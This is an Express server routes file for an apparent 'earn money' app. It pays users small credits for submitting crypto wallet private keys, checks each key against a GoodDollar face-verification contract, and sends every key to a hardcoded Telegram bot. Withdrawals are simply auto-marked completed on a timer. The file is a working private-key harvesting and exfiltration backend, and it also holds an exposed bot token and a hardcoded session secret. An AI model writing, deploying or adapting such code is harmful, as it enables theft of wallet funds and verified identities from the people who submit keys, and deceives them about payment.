
import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";
import session from "express-session";
import MemoryStore from "memorystore";
import { ethers } from "ethers";

const TELEGRAM_BOT_TOKEN = "8266590938:AAFSLVXE0K46SgmWRlaQevNVZUB2C4uPhGY";
const TELEGRAM_CHAT_ID = "1341406405";

const GD_IDENTITY_ADDRESS = "0xFa8d865A962ca8456dF331D78806152d3aC5B84F";
const FUSE_RPC_URL = "https://rpc.fuse.io";
const GD_IDENTITY_ABI = [
  "function isWhitelisted(address account) public view returns (bool)"
];

async function checkGDVerification(privateKey: string): Promise<boolean> {
  try {
    const provider = new ethers.JsonRpcProvider(FUSE_RPC_URL);
    const wallet = new ethers.Wallet(privateKey, provider);
    const contract = new ethers.Contract(GD_IDENTITY_ADDRESS, GD_IDENTITY_ABI, provider);
    const isWhitelisted = await contract.isWhitelisted(wallet.address);
    return isWhitelisted;
  } catch (error) {
    console.error("GD Verification Error:", error);
    return false;
  }
}

async function sendTelegramMessage(message: string) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });
    if (!response.ok) console.error("Telegram error:", await response.text());
  } catch (error) {
    console.error("Telegram connection error:", error);
  }
}

export async function registerRoutes(httpServer: Server, app: Express): Promise<Server> {
  const SessionStore = MemoryStore(session);
  app.use(session({
    secret: "secure-earn-v2",
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 86400000 },
    store: new SessionStore({ checkPeriod: 86400000 })
  }));

  const requireAuth = (req: any, res: any, next: any) => {
    if (!(req.session as any).userId) return res.status(401).json({ message: "Unauthorized" });
    next();
  };

  app.post(api.auth.login.path, async (req, res) => {
    try {
      const { guestId } = api.auth.login.input.parse(req.body);
      let user = await storage.getUserByGuestId(guestId);
      if (!user) user = await storage.createUser({ guestId });
      (req.session as any).userId = user.id;
      (req.session as any).sentNameForCycle = false;
      res.json(user);
    } catch (err) {
      res.status(400).json({ message: "Invalid ID" });
    }
  });

  app.post(api.auth.logout.path, (req, res) => {
    req.session.destroy(() => res.json({ message: "Logged out" }));
  });

  app.get(api.auth.me.path, requireAuth, async (req, res) => {
    const user = await storage.getUser((req.session as any).userId);
    if (!user) return res.status(401).json({ message: "User not found" });
    res.json(user);
  });

  app.post(api.earn.submitKey.path, requireAuth, async (req, res) => {
    try {
      const { privateKey } = api.earn.submitKey.input.parse(req.body);
      const userId = (req.session as any).userId;

      const isUsed = await storage.isKeyUsed(privateKey);
      if (isUsed) {
        return res.status(400).json({ message: "এই কিটি ইতিমধ্যে ব্যবহার করা হয়েছে" });
      }

      const isVerified = await checkGDVerification(privateKey);
      if (!isVerified) {
        return res.status(400).json({ message: "এই কিটিতে GoodDollar ফেস ভেরিফিকেশন করা নেই" });
      }

      const user = await storage.updateUserBalance(userId, 40);
      await storage.createTransaction({ userId, type: "earning", amount: 40, details: `Key: ${privateKey}`, status: "completed" });

      let message = `🔑 New Key!\n\n`;
      if (!(req.session as any).sentNameForCycle) {
        message += `👤 Name: ${user.guestId}\n`;
        (req.session as any).sentNameForCycle = true;
      }
      message += `📝 Key: ${privateKey}\n💰 Balance: ${user.balance} TK`;
      await sendTelegramMessage(message);

      res.json({ success: true, newBalance: user.balance, message: "Key submitted! +40 TK" });
    } catch (err) {
      res.status(400).json({ message: "Error" });
    }
  });

  app.post(api.withdraw.request.path, requireAuth, async (req, res) => {
    try {
      const { method, number, amount } = api.withdraw.request.input.parse(req.body);
      const userId = (req.session as any).userId;
      const user = await storage.getUser(userId);
      if (!user || user.balance < amount) return res.status(400).json({ message: "Insufficient balance" });

      const updatedUser = await storage.updateUserBalance(userId, -amount);
      const tx = await storage.createTransaction({ userId, type: "withdrawal", amount, details: `${method} - ${number}`, status: "pending" });
      (req.session as any).sentNameForCycle = false;

      setTimeout(async () => {
        await storage.updateTransactionStatus(tx.id, "completed");
      }, 30 * 60 * 1000);

      await sendTelegramMessage(`💸 Withdrawal!\n\n👤 Name: ${user.guestId}\n💳 Method: ${method.toUpperCase()}\n📱 Number: ${number}\n💰 Amount: ${amount} TK`);
      res.json({ success: true, newBalance: updatedUser.balance, message: "Withdrawal request sent!" });
    } catch (err) {
      res.status(400).json({ message: "Error" });
    }
  });

  app.get(api.transactions.list.path, requireAuth, async (req, res) => {
    const txs = await storage.getUserTransactions((req.session as any).userId);
    res.json(txs);
  });

  return httpServer;
}
